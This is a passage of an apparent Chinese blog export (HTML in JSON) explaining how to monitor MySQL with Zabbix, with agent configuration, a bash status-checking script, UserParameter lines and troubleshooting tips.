alt=\"\"></p>\n<p>6&#x3001;&#x5B89;&#x88C5;grafana-zabbix&#x63D2;&#x4EF6;&#xFF0C;&#x901A;&#x8FC7;grafana&#x76D1;&#x63A7;&#x76F8;&#x5173;&#x6570;&#x636E;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/3.png\" alt=\"\"></p>\n<p><br></p>\n<hr>\n<h3 id=\"&#x95EE;&#x9898;&#x6392;&#x67E5;&#x601D;&#x8DEF;\"><a href=\"#&#x95EE;&#x9898;&#x6392;&#x67E5;&#x601D;&#x8DEF;\" class=\"headerlink\" title=\"&#x95EE;&#x9898;&#x6392;&#x67E5;&#x601D;&#x8DEF;\"></a>&#x95EE;&#x9898;&#x6392;&#x67E5;&#x601D;&#x8DEF;</h3><p>&#x5982;&#x679C;&#x53D1;&#x73B0;&#x76D1;&#x63A7;&#x6CA1;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x8BF7;&#x6392;&#x67E5;&#x5982;&#x4E0B;&#x95EE;&#x9898;&#xFF1A;</p>\n<ul>\n<li>abbix&#x5BA2;&#x6237;&#x7AEF;&#x662F;&#x5426;&#x91CD;&#x542F;</li>\n<li>&#x811A;&#x672C;&#x662F;&#x5426;&#x6709;&#x6267;&#x884C;&#x6743;&#x9650;</li>\n<li>&#x6570;&#x636E;&#x5E93;&#x662F;&#x5426;&#x6709;&#x6743;&#x9650;</li>\n<li>&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x6709;&#x95EE;&#x9898;</li>\n<li>zabbix item&#x5217;&#x662F;&#x5426;&#x663E;&#x793A;&#x7EA2;&#x53C9;&#x3010;&#x9F20;&#x6807;&#x79FB;&#x81F3;&#x56FE;&#x6807;&#xFF0C;&#x6709;&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x3011;</li>\n</ul>\n<p><font style=\"color:red\">&#x5177;&#x4F53;&#x9519;&#x8BEF;&#xFF0C;&#x53EF;&#x4EE5;&#x67E5;&#x770B;zabbix agent&#x6253;&#x5370;&#x7684;&#x65E5;&#x5FD7;</font>&#x3002;<br>&#x9ED8;&#x8BA4;&#x5730;&#x5740;&#x4E3A;&#xFF1A;LogFile=/var/log/zabbix/zabbix_agentd.log&#xFF0C;&#x53EF;&#x5728;zabbix_agentd.conf&#x4E2D;&#x4FEE;&#x6539;&#x3002;</p>\n<p><font style=\"color:red\"><strong>&#x6B64;&#x5904;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;</strong></font>&#xFF0C;&#x6839;&#x636E;&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x4FEE;&#x6539;&#x4E86;&#x914D;&#x7F6E;&#xFF0C;&#x5E76;&#x91CD;&#x542F;&#x4E86;zabbix&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;zabbix &#x670D;&#x52A1;&#x5668;&#x7684;item&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x5E76;&#x4E0D;&#x4F1A;&#x9A6C;&#x4E0A;&#x6D88;&#x5931;&#xFF0C;&#x76D1;&#x63A7;&#x9875;&#x9762;&#x4E5F;&#x4E0D;&#x4F1A;&#x9A6C;&#x4E0A;&#x4EA7;&#x751F;&#x6570;&#x636E;&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x8981;&#x7ACB;&#x9A6C;&#x5224;&#x65AD;&#x4F60;&#x7684;&#x4FEE;&#x6539;&#x65E0;&#x6548;&#xFF0C;&#x6709;&#x6548;&#x65B9;&#x6CD5;&#x662F;&#x5148;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x6253;&#x5370;&#x3002;</p>\n<p><br></p>\n<hr>\n<h3 id=\"&#x9519;&#x8BEF;&#x76F8;&#x5173;\"><a href=\"#&#x9519;&#x8BEF;&#x76F8;&#x5173;\" class=\"headerlink\" title=\"&#x9519;&#x8BEF;&#x76F8;&#x5173;\"></a>&#x9519;&#x8BEF;&#x76F8;&#x5173;</h3><ul>\n<li><p>&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x3010;/bin/sh^M: bad interpreter: No such file or directory&#x3011;&#xFF0C;&#x90A3;&#x662F;shell&#x811A;&#x672C;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x9519;&#x8BEF;&#x5BFC;&#x81F4;&#x7684;&#xFF0C;vim&#x8FDB;&#x5165;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x6572;&#x547D;&#x4EE4;&#x3010;:set ff=unix&#x3011;&#xFF0C;&#x4FDD;&#x5B58;&#x9000;&#x51FA;&#x5373;&#x53EF;&#x3002;</p>\n</li>\n<li><p>&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x63D0;&#x793A;&#x8B66;&#x544A;&#x3010;mysqladmin: [Warning] Using a password on the command line interface can be insecure.&#x3011;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x989D;&#x5916;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;.my.cnf&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;check_mysql.sh&#x7684;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x7B49;&#x4ECE;.my.cnf&#x8BFB;&#x53D6;&#x3002;</p>\n</li>\n<li><p>&#x5982;&#x679C;zabbix&#x670D;&#x52A1;&#x5668;item&#x9879;&#x603B;&#x662F;&#x63D0;&#x793A;&#x3010;Not supported by Zabbix Agent&#x3011;&#xFF0C;&#x4E0D;&#x662F;&#x914D;&#x7F6E;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x7248;&#x672C;&#x95EE;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;zabbix server&#x4E0A;&#x6267;&#x884C;zabbix_get&#x547D;&#x4EE4;&#x6765;&#x8BD5;&#x7740;&#x83B7;&#x53D6;item&#x503C;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum list all |grep zabbix-get</span><br><span class=\"line\">yum install zabbix-get.x86_64</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/zabbix_get <span class=\"_\">-s</span> 127.0.0.1 -p 10050 -k <span class=\"string\">&quot;system.cpu.load[all,avg15]&quot;</span></span><br><span class=\"line\">0.270000</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><br></p>\n<hr>\n<h3 id=\"&#x5176;&#x4ED6;\"><a href=\"#&#x5176;&#x4ED6;\" class=\"headerlink\" title=\"&#x5176;&#x4ED6;\"></a>&#x5176;&#x4ED6;</h3><p>zabbix&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#xFF0C;&#x7528;&#x6765;&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x548C;nginx&#x7B49;&#x3002;<br>&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x7F51;&#x4E0A;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x5230;&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;&#x3010;&#x7EC4;&#x6001;&#x3011;-&gt;&#x3010;&#x6A21;&#x677F;&#x3011;-&gt;&#x3010;&#x6C47;&#x5165;&#x3011;&#x5373;&#x53EF;&#x3002;<br>&#x7531;&#x4E8E;&#x6C47;&#x5165;&#x7684;&#x6A21;&#x677F;&#x9ED8;&#x8BA4;&#x4F1A;&#x8986;&#x76D6;&#x539F;&#x6709;&#x914D;&#x7F6E;&#xFF0C;&#x6240;&#x4EE5;&#x8BB0;&#x5F97;&#x4E8B;&#x5148;&#x70B9;&#x51FB;&#x6A21;&#x677F;&#x5217;&#x8868;&#x5DE6;&#x4E0B;&#x89D2;&#x7684;&#x3010;&#x6C47;&#x51FA;&#x3011;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x6A21;&#x677F;&#x5907;&#x4EFD;&#x3002;</p>\n<p><br></p>\n","excerpt":"<blockquote>\n<p>zabbix&#x81EA;&#x5E26;mysql&#x76D1;&#x63A7;&#x6A21;&#x677F;&#xFF0C;&#x53EF;&#x76D1;&#x63A7;mysql&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;&#x3001;&#x8BF7;&#x6C42;&#x6D41;&#x91CF;&#x5E26;&#x5BBD;&#x548C;&#x54CD;&#x5E94;&#x6D41;&#x91CF;&#x5E26;&#x5BBD;&#x7B49;&#x3002;</p>\n</blockquote>\n<h3 id=\"&#x76D1;&#x63A7;&#x6B65;&#x9AA4;\"><a href=\"#&#x76D1;&#x63A7;&#x6B65;&#x9AA4;\" class=\"headerlink\" title=\"&#x76D1;&#x63A7;&#x6B65;&#x9AA4;\"></a>&#x76D1;&#x63A7;&#x6B65;&#x9AA4;</h3><p>1&#x3001;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5B89;&#x88C5;zabbix agent&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x5E76;&#x4FEE;&#x6539;zabbix_agentd.conf&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/zabbix/zabbix_agentd.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\">EnableRemoteCommands=1  &#x6765;&#x81F3;zabbix&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x88AB;&#x6267;&#x884C;</span><br><span class=\"line\">Server=zabbix_server_IP  zabbix&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;</span><br><span class=\"line\">ServerActive=zabbix_server_IP  &#x4E3B;&#x52A8;&#x5411;zabbix server&#x53D1;&#x9001;&#x76D1;&#x63A7;&#x5185;&#x5BB9;</span><br><span class=\"line\">Hostname=name  name&#x914D;&#x7F6E;&#x7684;&#x5185;&#x5BB9;&#x8981;&#x548C;zabbix&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x7684;Host name&#x4E00;&#x81F4;</span><br><span class=\"line\">UnsafeUserParameters=1  &#x662F;&#x5426;&#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;key,zabbix&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x7B49;&#x6570;&#x636E;&#x65F6;&#x9700;&#x8981;&#x81EA;&#x5B9A;&#x4E49;key</span><br></pre></td></tr></table></figure></p>\n<p>2&#x3001;&#x7F16;&#x5199;check_mysql.sh&#x811A;&#x672C;, &#x5B58;&#x653E;&#x8DEF;&#x5F84;&#xFF1A;/etc/zabbix/scripts&#x3002;<br>&#x5E76;&#x8D4B;&#x4E88;&#x811A;&#x672C;&#x6267;&#x884C;&#x6743;&#x9650;&#x3010;chmod +x check_mysql.sh&#x3011;&#x3002;</p>","more":"<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x7528;&#x6237;&#x540D;</span></span><br><span class=\"line\">MYSQL_USER=<span class=\"string\">&apos;&apos;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5BC6;&#x7801;</span></span><br><span class=\"line\">MYSQL_PWD=<span class=\"string\">&apos;&apos;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4E3B;&#x673A;&#x5730;&#x5740;/IP</span></span><br><span class=\"line\">MYSQL_HOST=<span class=\"string\">&apos;&apos;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x7AEF;&#x53E3;</span></span><br><span class=\"line\">MYSQL_PORT=<span class=\"string\">&apos;&apos;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6570;&#x636E;&#x8FDE;&#x63A5;</span></span><br><span class=\"line\">MYSQL_CONN=<span class=\"string\">&quot;/usr/bin/mysqladmin -u<span class=\"variable\">${MYSQL_USER}</span> -p<span class=\"variable\">${MYSQL_PWD}</span> -h<span class=\"variable\">${MYSQL_HOST}</span> -P<span class=\"variable\">${MYSQL_PORT}</span>&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x53C2;&#x6570;&#x662F;&#x5426;&#x6B63;&#x786E;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$#</span> <span class=\"_\">-ne</span> <span class=\"string\">&quot;1&quot;</span> ];<span class=\"keyword\">then</span> </span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;arg error!&quot;</span> </span><br><span class=\"line\"><span class=\"keyword\">fi</span> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x83B7;&#x53D6;&#x6570;&#x636E;</span></span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"variable\">$1</span> <span class=\"keyword\">in</span> </span><br><span class=\"line\">    Uptime) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> status|cut <span class=\"_\">-f</span>2 <span class=\"_\">-d</span><span class=\"string\">&quot;:&quot;</span>|cut <span class=\"_\">-f</span>1 <span class=\"_\">-d</span><span class=\"string\">&quot;T&quot;</span>` </span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">        ;; </span><br><span class=\"line\">    Com_update) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_update&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">        ;; </span><br><span class=\"line\">    Slow_queries) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> status |cut <span class=\"_\">-f</span>5 <span class=\"_\">-d</span><span class=\"string\">&quot;:&quot;</span>|cut <span class=\"_\">-f</span>1 <span class=\"_\">-d</span><span class=\"string\">&quot;O&quot;</span>` </span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">        ;; </span><br><span class=\"line\">    Com_select) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_select&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Com_rollback) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_rollback&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Questions) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> status|cut <span class=\"_\">-f</span>4 <span class=\"_\">-d</span><span class=\"string\">&quot;:&quot;</span>|cut <span class=\"_\">-f</span>1 <span class=\"_\">-d</span><span class=\"string\">&quot;S&quot;</span>` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Com_insert) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_insert&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Com_delete) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_delete&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Com_commit) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_commit&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Bytes_sent) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Bytes_sent&quot;</span> |cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Bytes_received) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Bytes_received&quot;</span> |cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">    Com_begin) </span><br><span class=\"line\">        result=`<span class=\"variable\">${MYSQL_CONN}</span> extended-status |grep -w <span class=\"string\">&quot;Com_begin&quot;</span>|cut <span class=\"_\">-d</span><span class=\"string\">&quot;|&quot;</span> <span class=\"_\">-f</span>3` </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"variable\">$result</span> </span><br><span class=\"line\">                ;; </span><br><span class=\"line\">                        </span><br><span class=\"line\">        *) </span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage:<span class=\"variable\">$0</span>(Uptime|Com_update|Slow_queries|Com_select|Com_rollback|Questions|Com_insert|Com_delete|Com_commit|Bytes_sent|Bytes_received|Com_begin)&quot;</span> </span><br><span class=\"line\">        ;; </span><br><span class=\"line\"><span class=\"keyword\">esac</span></span><br></pre></td></tr></table></figure>\n<p>3&#x3001;&#x4FEE;&#x6539;/etc/zabbix/zabbix_agentd.d&#x4E0B;&#x7684;userparameter_mysql.conf&#x6587;&#x4EF6;&#xFF0C;&#x6CA1;&#x6709;&#x5C31;&#x81EA;&#x884C;&#x521B;&#x5EFA;&#x3002;<br>&#x6CE8;&#x91CA;&#x6389;&#x539F;&#x6709;key&#xFF0C;&#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#x65B0;&#x589E;&#x5982;&#x4E0B;&#x6570;&#x636E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserParameter=mysql.version,mysql -V</span><br><span class=\"line\">UserParameter=mysql.ping,HOME=/var/lib/zabbix mysql ping | grep -c alive</span><br><span class=\"line\">UserParameter=mysql.status[*],/etc/zabbix/scripts/check_mysql.sh <span class=\"variable\">$1</span></span><br></pre></td></tr></table></figure></p>\n<p>4&#x3001;&#x91CD;&#x542F;zabbix&#x5BA2;&#x6237;&#x7AEF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service zabbix-agent restart</span><br></pre></td></tr></table></figure></p>\n<p>5&#x3001;&#x5728;zabbix&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x4E3B;&#x673A;&#x548C;mysql&#x6A21;&#x677F;&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;&#x3010;&#x56FE;&#x5F62;&#x3011;-&gt;&#x3010;&#x9884;&#x89C8;&#x3011;&#xFF0C;&#x67E5;&#x770B;&#x76F8;&#x5173;&#x76D1;&#x63A7;&#x56FE;&#x50CF;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/1.png\" alt=\"\"></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/2.png\" alt=\"\"></p>\n<p>6&#x3001;&#x5B89;&#x88C5;grafana-zabbix&#x63D2;&#x4EF6;&#xFF0C;&#x901A;&#x8FC7;grafana&#x76D1;&#x63A7;&#x76F8;&#x5173;&#x6570;&#x636E;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E7%9B%91%E6%8E%A7mysql/3.png\" alt=\"\"></p>\n<p><br></p>\n<hr>\n<h3 id=\"&#x95EE;&#x9898;&#x6392;&#x67E5;&#x601D;&#x8DEF;\"><a href=\"#&#x95EE;&#x9898;&#x6392;&#x67E5;&#x601D;&#x8DEF;\" class=\"headerlink\" title=\"&#x95EE;&#x9898;&#x6392;&#x67E5;&#x601D;&#x8DEF;\"></a>&#x95EE;&#x9898;&#x6392;&#x67E5;&#x601D;&#x8DEF;</h3><p>&#x5982;&#x679C;&#x53D1;&#x73B0;&#x76D1;&#x63A7;&#x6CA1;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x8BF7;&#x6392;&#x67E5;&#x5982;&#x4E0B;&#x95EE;&#x9898;&#xFF1A;</p>\n<ul>\n<li>abbix&#x5BA2;&#x6237;&#x7AEF;&#x662F;&#x5426;&#x91CD;&#x542F;</li>\n<li>&#x811A;&#x672C;&#x662F;&#x5426;&#x6709;&#x6267;&#x884C;&#x6743;&#x9650;</li>\n<li>&#x6570;&#x636E;&#x5E93;&#x662F;&#x5426;&#x6709;&#x6743;&#x9650;</li>\n<li>&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x6709;&#x95EE;&#x9898;</li>\n<li>zabbix item&#x5217;&#x662F;&#x5426;&#x663E;&#x793A;&#x7EA2;&#x53C9;&#x3010;&#x9F20;&#x6807;&#x79FB;&#x81F3;&#x56FE;&#x6807;&#xFF0C;&#x6709;&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x3011;</li>\n</ul>\n<p><font style=\"color:red\">&#x5177;&#x4F53;&#x9519;&#x8BEF;&#xFF0C;&#x53EF;&#x4EE5;&#x67E5;&#x770B;zabbix agent&#x6253;&#x5370;&#x7684;&#x65E5;&#x5FD7;</font>&#x3002;<br>&#x9ED8;&#x8BA4;&#x5730;&#x5740;&#x4E3A;&#xFF1A;LogFile=/var/log/zabbix/zabbix_agentd.log&#xFF0C;&#x53EF;&#x5728;zabbix_agentd.conf&#x4E2D;&#x4FEE;&#x6539;&#x3002;</p>\n<p><font style=\"color:red\"><strong>&#x6B64;&#x5904;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;</strong></font>&#xFF0C;&#x6839;&#x636E;&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x4FEE;&#x6539;&#x4E86;&#x914D;&#x7F6E;&#xFF0C;&#x5E76;&#x91CD;&#x542F;&#x4E86;zabbix&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;zabbix &#x670D;&#x52A1;&#x5668;&#x7684;item&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x5E76;&#x4E0D;&#x4F1A;&#x9A6C;&#x4E0A;&#x6D88;&#x5931;&#xFF0C;&#x76D1;&#x63A7;&#x9875;&#x9762;&#x4E5F;&#x4E0D;&#x4F1A;&#x9A6C;&#x4E0A;&#x4EA7;&#x751F;&#x6570;&#x636E;&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x8981;&#x7ACB;&#x9A6C;&#x5224;&#x65AD;&#x4F60;&#x7684;&#x4FEE;&#x6539;&#x65E0;&#x6548;&#xFF0C;&#x6709;&#x6548;&#x65B9;&#x6CD5;&#x662F;&#x5148;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x6253;&#x5370;&#x3002;</p>\n<p><br></p>\n<hr>\n<h3 id=\"&#x9519;&#x8BEF;&#x76F8;&#x5173;\"><a href=\"#&#x9519;&#x8BEF;&#x76F8;&#x5173;\" class=\"headerlink\" title=\"&#x9519;&#x8BEF;&#x76F8;&#x5173;\"></a>&#x9519;&#x8BEF;&#x76F8;&#x5173;</h3><ul>\n<li><p>&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x3010;/bin/sh^M: bad interpreter: No such file or directory&#x3011;&#xFF0C;&#x90A3;&#x662F;shell&#x811A;&#x672C;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x9519;&#x8BEF;&#x5BFC;&#x81F4;&#x7684;&#xFF0C;vim&#x8FDB;&#x5165;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x6572;&#x547D;&#x4EE4;&#x3010;:set ff=unix&#x3011;&#xFF0C;&#x4FDD;&#x5B58;&#x9000;&#x51FA;&#x5373;&#x53EF;&#x3002;</p>\n</li>\n<li><p>&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x63D0;&#x793A;&#x8B66;&#x544A;&#x3010;mysqladmin: [Warning] Using a password on the command line interface can be insecure.&#x3011;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x989D;&#x5916;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;.my.cnf&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;check_mysql.sh&#x7684;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x7B49;&#x4ECE;.my.cnf&#x8BFB;&#x53D6;&#x3002;</p>\n</li>\n<li><p>&#x5982;&#x679C;zabbix&#x670D;&#x52A1;&#x5668;item&#x9879;&#x603B;&#x662F;&#x63D0;&#x793A;&#x3010;Not supported by Zabbix Agent&#x3011;&#xFF0C;&#x4E0D;&#x662F;&#x914D;&#x7F6E;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x7248;&#x672C;&#x95EE;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;zabbix server&#x4E0A;&#x6267;&#x884C;zabbix_get&#x547D;&#x4EE4;&#x6765;&#x8BD5;&#x7740;&#x83B7;&#x53D6;item&#x503C;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum list all |grep zabbix-get</span><br><span class=\"line\">yum install zabbix-get.x86_64</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/zabbix_get <span class=\"_\">-s</span> 